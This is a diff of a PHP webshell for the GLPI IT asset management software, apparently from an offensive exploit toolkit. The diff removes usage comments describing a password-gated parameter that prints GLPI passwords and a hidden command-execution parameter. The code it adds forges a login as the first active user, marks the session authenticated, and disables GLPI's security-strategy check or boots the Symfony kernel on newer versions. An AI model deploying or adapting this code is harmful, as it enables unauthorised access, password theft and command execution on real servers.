@@ -1,10 +1,6 @@
 <?php
 
 /****************************************************************
- * Webshell Usage:
- *   ?passwd=P@ssw0rd123 --> Print glpi passwords in use
- *   ?passwd=P@ssw0rd123&_hidden_cmd=whoami --> Execute whoami
- *
  * Used here exploits/utils/glpi_utils.py:method:get_glpi_shell
  *
  * ```bash
@@ -91,14 +87,14 @@ function fakelogin(){
         }
 
         if(version_compare(GLPI_VERSION, '10.0.0', '<')){
-            $query = "
-                SELECT id
-                FROM " . User::getTable() . "
-                WHERE is_active = 1
-                  AND is_deleted = 0
-                LIMIT 1
-                ";
-            $iterator = $DB->query($query);
+            $iterator = $DB->request(User::getTable(), [
+                'FIELDS' => ['id'],
+                "WHERE"  => [
+                    "is_active"  => 1,
+                    "is_deleted" => 0,
+                ],
+                "LIMIT" => 1
+            ]);
         } else {
             $iterator = $DB->request([
                 "SELECT" => ["id"],
@@ -115,7 +111,11 @@ function fakelogin(){
             return false;
         }
 
-        $user_id = $iterator->current()["id"];
+        foreach($iterator as $row){
+            $user_id = $row["id"];
+            break;
+        }
+
         $user = new User();
         if (!$user->getFromDB($user_id)) {
             return false;
@@ -126,6 +126,7 @@ function fakelogin(){
         $auth->auth_succeded = true;
         $auth->user = $user;
         Session::init($auth);
+        set_authenticated();
         return true;
     } catch(Exception $e) {
         echo $e->getMessage();
@@ -255,20 +256,38 @@ function set_authenticated(){
     }
 }
 
-// At first we must absolutely load session or else you'll need password
+/**
+ * This webshell handle three cases:
+ *  - Direct access on versions < 11
+ *  - Loaded from symfony LegacyController
+ *  - Direct access on versions >= 11
+ */
 if (!isset($GLOBALS['kernel'])) {
-    // Not running inside Symfony, need to load includes.php
+    // Kernel does not exists (we are not in symfony)
+    // Is this a version that uses symfony and thus deprecate the use of $SECURITY_STRATEGY
     $SECURITY_STRATEGY = "no_check";
     for ($i=0; $i < 4; $i++) {
-            $relative = str_repeat("../", $i);
+        $relative = str_repeat("../", $i);
 
-            $to_include = "{$relative}inc/includes.php";
-            if(file_exists($to_include)){
+        $to_include = "{$relative}inc/includes.php";
+        $vendor = "{$relative}vendor/autoload.php";
+        if(file_exists($to_include)){
+            if(strpos(file_get_contents($to_include), "variable has no effect") === false)
+            {   // Version that support SECURITY_STRATEGY
                 include_once($to_include);
-                break;
+            } else {
+                // Symfony direct access, we need to unset SECURITY_STRATEGY and boot the kernel
+                unset($SECURITY_STRATEGY);
+                if(is_file($vendor)){
+                    include_once($vendor);
+                    $kernel = new Glpi\Kernel\Kernel();
+                    $kernel->boot();
+                }
+            }
+            break;
         }
     }
-}
+} // else --> Included from legacy controller, nothing to do
 
 // Check if we successfully included GLPI
 if(isset($GLOBALS["DB"])){
